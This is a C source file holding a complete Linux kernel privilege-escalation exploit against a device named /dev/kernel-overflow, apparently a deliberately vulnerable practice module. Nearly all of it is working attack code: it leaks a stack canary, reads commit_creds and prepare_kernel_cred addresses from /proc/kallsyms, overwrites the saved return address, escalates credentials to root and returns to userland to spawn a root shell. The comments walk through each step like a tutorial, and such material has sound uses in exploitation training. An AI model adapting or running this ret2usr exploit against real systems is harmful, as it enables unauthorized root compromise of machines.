#define _GNU_SOURCE
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define KERN_MODULE "/dev/kernel-overflow"

#define WORD_SIZE 8
#define BUF_SIZE 0x100

// Globals used in shellcode
unsigned long user_cs, user_ss, user_rflags, user_sp;
unsigned long prepare_kernel_cred;
unsigned long commit_creds;
unsigned long user_rip;

void exit_and_log(char *msg) {
  fprintf(stderr, "%s", msg);
  exit(-1);
}

/*
 * Once our gid and uid are 0 we are root!
 * Stop running this and run a shell instead
 */
void drop_shell(void) {
  printf("[*] Returned to userland\n");
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  if (getuid() == 0 && getgid() == 0) {
    printf("[*] UID: %d\n", getuid());
    printf("[*] GID: %d\n", getuid());
    execve(argv[0], argv, envp);
  }
  exit_and_log("Failed to priv\n");
}

/*
 * When going from kernel mode to user mode
 * we need to restore the register state.
 */
void save_state() {
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax;");
  printf("Saved cs, ss, rsp, rflags registers\n");
}

/*
 * Our kernel addresses for commit_creds and prepare_kernel_cred
 * are available in /proc/kallsyms. We can read them here and
 * store them globally to reference later
 */
void get_kernel_addresses() {
  FILE *fp;
  char *line = NULL;
  size_t len = 0;
  ssize_t read;

  fp = fopen("/proc/kallsyms", "r");
  if (fp == NULL)
    exit_and_log("failed to open kallsyms\n");

  while ((read = getline(&line, &len, fp)) != -1) {
    if (strstr(line, "prepare_kernel_cred") != NULL) {
      prepare_kernel_cred = strtoul(line, NULL, 16);
    }
    if (strstr(line, "commit_creds") != NULL) {
      commit_creds = strtoul(line, NULL, 16);
    }
  }

  fclose(fp);
  if (line)
    free(line);

  printf("prepare_kernel_cred\t: 0x%lX\n", prepare_kernel_cred);
  printf("commit_creds\t\t: 0x%lX\n", commit_creds);
}

/*
 * We are trying to make the following call:
 * commit_creds(prepare_kernel_cred(NULL))
 * This will prepare a new cred struct with
 * root creds
 */
void give_me_root() {
  // Set end RIP value to our shell drop
  user_rip = (unsigned long)drop_shell;

  __asm__(".intel_syntax noprefix;"
          "movabs rax, prepare_kernel_cred;"
          "xor rdi, rdi;"
          "call rax; mov rdi, rax;"
          "movabs rax, commit_creds;"
          "call rax;"
          "swapgs;"
          "mov r15, user_ss;"
          "push r15;"
          "mov r15, user_sp;"
          "push r15;"
          "mov r15, user_rflags;"
          "push r15;"
          "mov r15, user_cs;"
          "push r15;"
          "mov r15, user_rip;"
          "push r15;"
          "iretq;"
          ".att_syntax;");
}

unsigned long do_leak(int fd) {
  int bytes_read;
  unsigned long *buf = NULL;
  unsigned long stack_cookie;
  unsigned int cookie_offset = 16;

  buf = malloc(BUF_SIZE);
  if (buf == NULL)
    exit_and_log("Failed to malloc\n");

  memset(buf, '\x00', BUF_SIZE);

  bytes_read = read(fd, buf, BUF_SIZE);

  for (int i = 0; i < (BUF_SIZE / WORD_SIZE); i++) {
    if (i == cookie_offset) {
      printf("buf + 0x%X\t: %lX <------- Stack cookie\n", i * WORD_SIZE,
             buf[i]);
    } else {
      printf("buf + 0x%X\t: %lX\n", i * WORD_SIZE, buf[i]);
    }
  }

  stack_cookie = buf[cookie_offset];
  free(buf);

  return stack_cookie;
}

void overwrite_pc(int fd, unsigned long stack_cookie) {
  unsigned long *buf = NULL; //[BUF_SIZE];
  unsigned int cookie_offset = 16;
  int bytes_written;

  buf = malloc(BUF_SIZE);
  if (buf == NULL)
    exit_and_log("Failed to malloc\n");

  memset(buf, '\x00', BUF_SIZE);

  buf[cookie_offset] = stack_cookie;
  buf[cookie_offset + 1] = 0x4141414141414141;          // rbx
  buf[cookie_offset + 2] = (unsigned long)give_me_root; // rip

  // After this write we won't return to the
  // rest of this function
  bytes_written = write(fd, buf, BUF_SIZE);

  printf("Write returned %d\n", bytes_written);

  free(buf);
}

void main() {
  /*
   * Interacting with this kernel module is easy
   * just treat it like a file
   */

  int fd;
  unsigned long stack_cookie;

  fd = open(KERN_MODULE, O_RDWR);
  if (fd < 0)
    exit_and_log("Failed to open kernel module\n");

  /*
   * Just like a userspace buffer overflow, a stack
   * read will give us the stack cookie that we can
   * use when doing our kernel space overflow
   */
  stack_cookie = do_leak(fd);

  /*
   * Get prepare_kernel_cred and commit_creds using
   * /proc/kallsyms
   */
  get_kernel_addresses();

  /*
   * Get registers that we'll need to restore later
   */
  save_state();

  /*
   * Overwrite the program counter and execute our
   * shellcode!
   */
  overwrite_pc(fd, stack_cookie);

  printf("At end of main\n");

  close(fd);
}